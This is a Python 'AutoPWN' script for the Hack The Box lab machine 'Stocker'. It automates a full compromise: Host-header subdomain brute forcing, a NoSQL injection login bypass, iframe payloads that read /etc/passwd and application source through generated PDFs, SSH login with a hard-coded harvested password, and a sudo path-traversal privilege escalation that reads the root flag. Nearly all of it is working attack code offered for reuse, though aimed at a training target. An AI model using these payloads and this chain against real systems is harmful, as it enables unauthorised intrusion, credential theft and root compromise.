import requests
import time
import json
import paramiko
import sys
from concurrent.futures import ThreadPoolExecutor

Palette = {
    'red': '\033[31m',
    'green': '\033[32m',
    'yellow': '\033[33m',
    'blue': '\033[34m',
    'purple': '\033[35m',
    'cyan': '\033[36m',
    'grey': '\033[37m',
    'reset': '\033[0m'
}

def banner():
    print( Palette["green"] + """
 _   _ _____ ____ ____  _             _             
| | | |_   _| __ ) ___|| |_ ___   ___| | _____ _ __ 
| |_| | | | |  _ \___ \| __/ _ \ / __| |/ / _ \ '__|
|  _  | | | | |_) |__) | || (_) | (__|   <  __/ |   
|_| |_| |_| |____/____/ \__\___/ \___|_|\_\___|_|   
                                                    
    _         _                            
   / \  _   _| |_ ___  _ ____      ___ __  
  / _ \| | | | __/ _ \| '_ \ \ /\ / / '_ \ 
 / ___ \ |_| | || (_) | |_) \ V  V /| | | |
/_/   \_\__,_|\__\___/| .__/ \_/\_/ |_| |_| by Void4m0n
                      |_|         
""" + Palette["reset"])


def waiting_animation():
    for i in range(3):
        print(Palette['yellow'] + ".", end='',flush=True)
        time.sleep(0.7)
    print(Palette['reset'], end='')
    return

def beuty_menssage(color, message, wait_boolean, jump_boolean):
    print(Palette[f"{color}"] + message + Palette["reset"], end='')
    if wait_boolean == True:
        waiting_animation()
    else:  
        pass
    if jump_boolean == True:
        print("\n")
    else: 
        pass

def exit():
    beuty_menssage("red", "[X] Closing Script", False, True)
    sys.exit()

def try_conex(url): 
    beuty_menssage("yellow", "[*] Checking status of Stocker", True, True)
    for i in range(10):
        try:
            r = requests.head(url, timeout=5)
            break
        except requests.exceptions.RequestException as e:
            i += 1 
            if i == 1:
                beuty_menssage("red", "[!] Stocker seems to be down, the script will attempt 10 times to establish the connection", False, True)
                beuty_menssage("purple", f"    [?] CHECK URL --> {url}", False, True)
            counter_to_str = str(i)
            beuty_menssage("red", "[!] STOCKER DOWN! ", False, False)
            beuty_menssage("purple", f"--> {counter_to_str} TRY", False, True)
            time.sleep(15)
            if i == 10:   
                exit()
    beuty_menssage("green", "[+] STOCKER UP!", False, True) 


def create_subdomains_wordlist():
    try:
        subdomains = open('subdomains.txt', 'r')  
        content = subdomains.read()  
        subdomains_list= content.split('\n')
    except Exception as e:
        beuty_menssage("red", f"[!] Something went wrong: {e}", False, True)
        exit()
    return subdomains_list

def check_subdomain(subdomain, url):
    headers = {'host': f'{subdomain}.stocker.htb'}
    try:
        brute_force_request = requests.get(url, headers=headers, allow_redirects=False, timeout=5)    
        code = brute_force_request.status_code
        if code == 302:
            print(Palette["green"] + "\n    [+] Found: " + Palette["purple"] + f"{subdomain}.stocker.htb " + "Code: " + Palette["green"] + str(code) + '\n' + Palette["reset"]) 
            return code,subdomain
        else:
            print(Palette["red"] + "    [X] Error: " + Palette["purple"] + f"{subdomain}.stocker.htb " + "Code: " + Palette["red"] + str(code) + Palette["reset"])
    except Exception as e:
        beuty_menssage("red", f"[!] Something went wrong: {e}", False, True)
 
def bruteforce_subdomain(url):
    beuty_menssage("yellow", "[*] Initializing brute force subdomains with 10 threads", True, True)

    subdomains_list = create_subdomains_wordlist()
    with ThreadPoolExecutor(max_workers=10) as executor:             
        tareas = []
        for subdomain in subdomains_list: 
            future = executor.submit(check_subdomain, subdomain, url)
            tareas.append(future)
        for tarea in tareas: 
            result = tarea.result()
            if result is not None:
                code, subdomain = tarea.result()
                if code == 302:
                    for f in tareas:
                        f.cancel()
                    break 
                else:
                    pass 
    return subdomain

def No_sqli_login_bypass(subdomain, url):
    url_login = url + "login"
    beuty_menssage("yellow", f"\n[*] Login panel found at {subdomain}.stocker.htb, trying NoSQLI injection to perform an authentication bypass", True, True)
    main_session = requests.Session()
    headers = {
            'host':f'{subdomain}.stocker.htb',
            'Content-Type':'application/json'
            }
    # RESOURCE --> https://book.hacktricks.xyz/pentesting-web/nosql-injection#basic-authentication-bypass
    data =  {"username":{"$ne": None}, "password":{"$ne": None}}
    data_to_print = '{"username":{"$ne": null}, "password":{"$ne": null}}'

    request_login_bypass_nosqli = main_session.post(url_login, headers=headers, json=data)
    beuty_menssage("purple", "    [!] Payload: ", False, False)
    beuty_menssage("green", f"{data_to_print}", False, True)
    if "Basket" in request_login_bypass_nosqli.text:
        beuty_menssage("green", "    [+] Bypass achieved", False, True)
    else:
        pass
    return main_session

def lfi_xss_injection(main_session, url, subdomain):
    new_product_url = url + "api/order"
    headers = {
        'host':f'{subdomain}.stocker.htb',
        'Content-Type':'application/json'
        }

    # I cannot automate the data extraction in the LFI of the pdf so I set the variables Username and angoose_password after injecting the payload.
    # LFI VECTOR RESOURCE --> https://blog.dixitaditya.com/xss-to-read-internal-files
    # /ETC/PASSWD LFI
    beuty_menssage("yellow", "[*] Injecting LFI through XSS to extract /etc/passwd file", True, True)   
    data =  {"basket":[{"_id":"638f116eeb060210cbd83a8d","title":"<iframe src=file:///etc/passwd height=1000px width=800px>","description":"It's a red cup.","image":"red-cup.jpg","price":32,"currentStock":4,"__v":0,"amount":1}]}
    lfi_etc_passwd = main_session.post(new_product_url, headers=headers, json=data)
    response_json = lfi_etc_passwd.json()
    order_id = response_json["orderId"]
    beuty_menssage("purple", "    [+] Password found inside /etc/passwd file: ", False, False)
    beuty_menssage("green", f"http://{subdomain}.stocker.htb/api/po/{order_id}", False, True)
    beuty_menssage("purple", "    [!] Interesting User: ", False, False)
    Username = "angoose"
    beuty_menssage("green", f"{Username}", False, True)

    # INDEX.JS LFI
    beuty_menssage("yellow", "[*] Injecting LFI through XSS to extract index.js file", True, True)
    data =  {"basket":[{"_id":"638f116eeb060210cbd83a8d","title":"<iframe src=file:///var/www/dev/index.js height=1000px width=800px>","description":"It's a red cup.","image":"red-cup.jpg","price":32,"currentStock":4,"__v":0,"amount":1}]}
    lfi_index_js = main_session.post(new_product_url, headers=headers, json=data)
    response_json = lfi_index_js.json()
    order_id = response_json["orderId"]
    beuty_menssage("purple", "    [+] Users found inside index.js file: ", False, False)
    beuty_menssage("green", f"http://{subdomain}.stocker.htb/api/po/{order_id}", False, True)
    beuty_menssage("purple", "    [!] MongoDB password found: ", False, False)
    angoose_password = "IHeardPassphrasesArePrettySecure"
    beuty_menssage("green", f"{angoose_password}", False, True)
    return Username, angoose_password 

def ssh_conex(Username, angoose_password):
    beuty_menssage("yellow", f"[*] Trying to connect via ssh with the credentials {Username}:{angoose_password}", True, True)
    # Make connex with paramiko 
    try:
        ssh = paramiko.SSHClient()
        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        ssh.connect("10.10.11.196", username=Username, password=angoose_password)
    except Exception as e:    
        beuty_menssage("red", f"[!] Something went wrong: {e}", False, True)
        exit()

   # check intrusion with ifconfig 
    try:
        ssh_stdin_user_txt, ssh_stdout_user_txt, ssh_stderr_user_txt = ssh.exec_command("ifconfig")
        ifconfig_output = ssh_stdout_user_txt.readlines()
    except Exception as e:
        beuty_menssage("red", f"[!] Something went wrong: {e}", False, True)
        exit()

    beuty_menssage("purple", "    [+] Successful ssh connection (ifconfig output): ",False, True)
    print(Palette["green"], end='')
    contador = 0
    for i in ifconfig_output:
        contador += 1
        if contador < 10:
            print(f"    {contador}| " + i,  end='')
        elif contador == 16:
            pass
        else:
            print(f"   {contador}| " + i,  end='')
    print(Palette["reset"])
   

    # Extract USER.TXT PASS
    try:
        beuty_menssage("yellow", "[*] Extracting user flag from User.txt file", True, True)
        ssh_stdin_user_txt, ssh_stdout_user_txt, ssh_stderr_user_txt = ssh.exec_command("cat ./user.txt")
        user_txt_flag = ssh_stdout_user_txt.readlines()
    except Exception as e:
        beuty_menssage("red", f"[!] Something went wrong: {e}", False, True)
        exit()

    beuty_menssage("purple", "    [+] User flag: ", False, False)
    print(Palette["green"], end='')
    for i in user_txt_flag:
        print(i,  end='')
    print(Palette["reset"])
   
    beuty_menssage("yellow", f"[*] Sudo -l perms found", True, True)

    # Check privesc vector
    try:
        ssh_stdin, ssh_stdout, ssh_stderr = ssh.exec_command("sudo -S -l")
        ssh_stdin.write("IHeardPassphrasesArePrettySecure" + "\n") 
        ssh_output=ssh_stdout.readlines()
    except Exception as e:
        beuty_menssage("red", f"[!] Something went wrong: {e}", False, True)
        exit()

    beuty_menssage("purple", "    [!] Sudo -l output: ", False, True)
    print(Palette["green"], end='')
    contador = 0
    for i in ssh_output:
        contador += 1
        print(f"    {contador}| " + i,  end='')
    print(Palette["reset"])


    beuty_menssage("yellow", f"[*] Uploading payload to exploit the privesc vector", True, True)
    # Upload privesc payload
    try:
        ftp_client=ssh.open_sftp()
        ftp_client.put('./privesc.js','./privesc.js')
        ftp_client.close()
    except Exception as e:
        beuty_menssage("red", f"[!] Something went wrong: {e}", False, True)
        exit()

    # cat file
    try:
        ssh_stdin, ssh_stdout, ssh_stderr = ssh.exec_command("cat ./privesc.js")
        ssh_cat_payload=ssh_stdout.readlines()
    except Exception as e:
        beuty_menssage("red", f"[!] Something went wrong: {e}", False, True)
        exit()

    beuty_menssage("purple", "    [!] Exploit uploaded:", False, True)
    print(Palette["green"], end='')
    contador = 0
    for i in ssh_cat_payload:
        contador += 1 
        print(f"    {contador}| " + i, end='') 
    print(Palette["reset"])

    # Exploit privesc vector
    beuty_menssage("yellow", "[*] Sending exploit command", True, True)
    command = "sudo -S /usr/bin/node /usr/local/scripts/../../../home/angoose/privesc.js"
    try:
        ssh_stdin, ssh_stdout, ssh_stderr = ssh.exec_command(command)
        ssh_stdin.write("IHeardPassphrasesArePrettySecure" + "\n")
    except Exception as e:
        beuty_menssage("red", f"[!] Something went wrong: {e}", False, True)
        exit()

    beuty_menssage("purple", "    [+] Command: ", False, False)
    beuty_menssage("green", f"{command}", False, True)

    # Extract ROOT.TXT flag 
    beuty_menssage("yellow", "[*] Extracting root flag", True, True)
    try:
        ssh_stdin, ssh_stdout, ssh_stderr = ssh.exec_command("/bin/bash -p -c 'cat /root/root.txt'")
        ssh_root_flag=ssh_stdout.readlines()
    except Exception as e:
        beuty_menssage("red", f"[!] Something went wrong: {e}", False, True)
        exit()
    
    beuty_menssage("purple", "    [+] Root flag: ", False, False)
    print(Palette["green"], end='')
    for i in ssh_root_flag:
        print(i, end='') 
    print(Palette["reset"])


def final_banner():
    beuty_menssage("yellow", "[*] Finishing exploit", True, True)
    beuty_menssage("purple", "    [*] Exploit complete! Maybe a RESPECT, STAR or FOLLOW ;)?", False, True)
    beuty_menssage("green", "    [!] HTB PROFILE --> https://app.hackthebox.com/profile/1104062\n", False, False)
    beuty_menssage("grey", "    [!] GITHUB REPO --> https://github.com/Void4m0n/AutoPWN_HTB\n", False, False)
    beuty_menssage("cyan", "    [!] MY TWITTER ACCOUNT --> https://twitter.com/Void4m0n\n", False, False)

if __name__ == "__main__":
    url = "http://10.10.11.196:80/"
    banner()
    try_conex(url)
    subdomain = bruteforce_subdomain(url)
    main_session = No_sqli_login_bypass(subdomain, url)
    Username, angoose_password = lfi_xss_injection(main_session, url, subdomain)
    ssh_conex(Username, angoose_password)
    final_banner()    
